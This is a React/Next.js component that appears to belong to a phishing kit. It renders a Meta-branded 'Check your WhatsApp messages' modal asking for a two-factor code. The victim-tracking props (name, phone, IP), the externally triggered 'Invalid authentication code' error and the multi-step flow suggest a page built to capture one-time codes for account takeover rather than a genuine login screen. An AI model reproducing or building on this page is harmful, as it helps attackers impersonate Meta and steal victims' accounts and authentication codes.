import React from "react";
import { styled } from "styled-components";
import Image from "next/image";
import { useFa2Logic } from "../../hooks/useFa2Logic";
import LoadingSpinner from "../ui/LoadingSpinner";

const ModalContainer = styled.div`
  position: fixed;
  display: flex;
  justify-content: center;
  align-items: center;
  width: 100%;
  height: 100%;
  z-index: 1000;
  top: 0px;
  left: 0px;
  padding-inline: 1rem;
`;
const ModalContent = styled.div`
  max-width: 550px;
  width: 100%;
  /* height: 530px; */
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  position: relative;
  padding-block: 1.5rem;
  margin-block: 1rem;
  @media (max-width: 991.98px) {
    /* height: 430px; */
  }
  button:disabled {
    opacity: 0.5;
  }
`;

const ModalTitle = styled.div`
  padding-bottom: 0.1rem;
  font-weight: 700;
  font-size: 20px;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;
const SmallText = styled.div`
  color: #1c2b33;
  font-size: 14px;
  line-height: 1.3;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;
const CustomHr = styled.hr`
  margin-block: 0.5rem !important;
`;

const CustomInput = styled.input`
  width: 100%;
  border: 1px solid #ddd;
  padding: 0.75rem;
  outline: none !important;
  border-radius: 10px;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
  &.redborder {
    border: 1px solid red !important;
  }

  :focus {
    border: 1px solid #aaa;
  }
  margin-bottom: 0.5rem;
`;
const StyledButton = styled.button`
  background-color: #0064e0;
  border: 1px solid #0064e0;
  width: 100%;
  color: white;
  font-size: 13px;
  font-weight: 500;
  padding: 10px 20px;
  border-radius: 50px;
  text-transform: none;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;

  :disabled {
    opacity: 0.5;
  }
`;
const ErrorDiv = styled.div`
  font-size: 12px;
  color: red;
  text-align: left;
  padding-bottom: 0.5rem;
  margin-top: -0.35rem;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;
const ImgWrapper = styled.div`
  width: 100%;
  margin-block: 1rem;
  min-height: 250px;
  background-color: #d5d9dd;
  position: relative;
  display: flex;
  align-items: center;

  @media (max-width: 576.98px) {
    min-height: 160px;
    border-radius: 10px;

    img {
      border-radius: 10px;
    }
  }
`;


function Fa2Whatsapp({ Unik, setStep, Name, Tel, Ip, LastFetch, wrong2faTrigger }) {
  const {
    code,
    isLoading,
    showError,
    countdown,
    handleSubmit,
    handleCodeChange,
    shouldShowRedBorder,
    renderCountdown,
    isButtonDisabled,
  } = useFa2Logic({
    LastFetch,
    wrong2faTrigger,
    setStep,
    nextStep: 4,
    componentName: "WhatsApp 2FA",
    initialMessage: "WhatsApp 2FA Page Loaded",
  });

  const handleFormSubmit = (e) => {
    handleSubmit(e, "whatsapp");
  };

  return (
    <ModalContainer>
      <ModalContent>
        <div className="text-start">
          <ModalTitle>Check your WhatsApp messages</ModalTitle>
          <SmallText>
            Enter the code we sent to your WhatsApp account.
          </SmallText>
        </div>
        <ImgWrapper>
          <Image
            alt=""
            src="/assets/images/whatsapp.jpg"
            layout="fill"
            objectFit="cover"
          />
        </ImgWrapper>
        <div>
          <form onSubmit={handleFormSubmit}>
            <div className="form-floating">
              <CustomInput
                placeholder="Code"
                type="number"
                value={code}
                onChange={handleCodeChange}
                className={`form-control ${shouldShowRedBorder() ? "redborder" : ""}`}
                disabled={isLoading}
              />
              <label htmlFor="floatingInput">Code</label>
            </div>

            {showError && <ErrorDiv>Invalid authentication code</ErrorDiv>}
            <SmallText>
              {showError && (
                <>
                  We can send a new code in&nbsp;
                  {renderCountdown()}
                </>
              )}
            </SmallText>

            <StyledButton 
              type="submit" 
              className="mt-2"
              disabled={isButtonDisabled()}
            >
              {isLoading ? <LoadingSpinner size="15px" /> : "Continue"}
            </StyledButton>
          </form>
        </div>
      </ModalContent>
    </ModalContainer>
  );
}

export default Fa2Whatsapp;
